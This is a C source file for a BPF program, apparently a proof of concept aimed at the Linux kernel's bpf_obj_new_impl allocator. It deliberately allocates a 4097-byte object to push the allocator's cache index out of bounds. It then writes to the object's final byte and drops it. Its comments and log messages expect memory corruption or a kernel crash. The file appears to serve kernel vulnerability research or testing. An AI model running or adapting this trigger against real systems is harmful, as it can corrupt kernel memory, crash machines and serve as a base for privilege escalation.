// SPDX-License-Identifier: GPL-2.0
/* BPF program to test bpf_obj_new_impl kfunc */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char _license[] SEC("license") = "GPL";

/* LARGE STRUCTURE - EXACTLY 4105 BYTES (4097 + 8 padding)
 * Goal: Trigger out-of-bounds cache index or integer overflow
 * After +8 for LLIST_NODE_SZ: 4113 bytes
 * fls(4112) - 2 = 13 - 2 = 11 (index 11 = out of bounds for NUM_CACHES=11)
 */
struct large_obj {
	char big_array[4097];  /* Exactly 4097 bytes to exceed 4096 limit */
};

/* Declare kfuncs */
extern void *bpf_obj_new_impl(__u64 local_type_id__maybe_null, void *meta__maybe_null) __ksym;
extern void bpf_obj_drop_impl(void *kptr, void *meta__maybe_null) __ksym;

#define bpf_obj_new(type) ((type *)bpf_obj_new_impl(bpf_core_type_id_local(type), NULL))
#define bpf_obj_drop(kptr) bpf_obj_drop_impl(kptr, NULL)

SEC("tc")
int test_obj_alloc(struct __sk_buff *ctx)
{
	struct large_obj *obj;
	unsigned long size = sizeof(struct large_obj);
	int i;

	/* Try to allocate a HUGE object (~10KB) */
	bpf_printk("BPF prog: Attempting allocation, sizeof(large_obj)=%lu\n", size);

	obj = bpf_obj_new(typeof(*obj));
	if (!obj) {
		bpf_printk("BPF prog: bpf_obj_new failed for size=%lu\n", size);
		return 0;
	}

	/* If this succeeds, we have a serious problem! */
	bpf_printk("BPF prog: WARNING! Allocated %lu bytes successfully!\n", size);

	/* Write to various parts of the structure */
	bpf_printk("BPF prog: Writing to data array...\n");

	/* Write to various positions to test buffer overflow */
	obj->big_array[0] = 'A';        /* Beginning */
	obj->big_array[100] = 'B';      /* Near beginning */
	obj->big_array[2000] = 'M';     /* Middle */
	obj->big_array[4000] = 'X';     /* Near end */
	obj->big_array[4096] = 'Z';     /* Last byte */

	bpf_printk("BPF prog: Wrote to all fields - memory corruption likely!\n");

	/* Try to drop - this will likely crash */
	bpf_obj_drop(obj);

	bpf_printk("BPF prog: Drop succeeded - surprising!\n");

	return 0;
}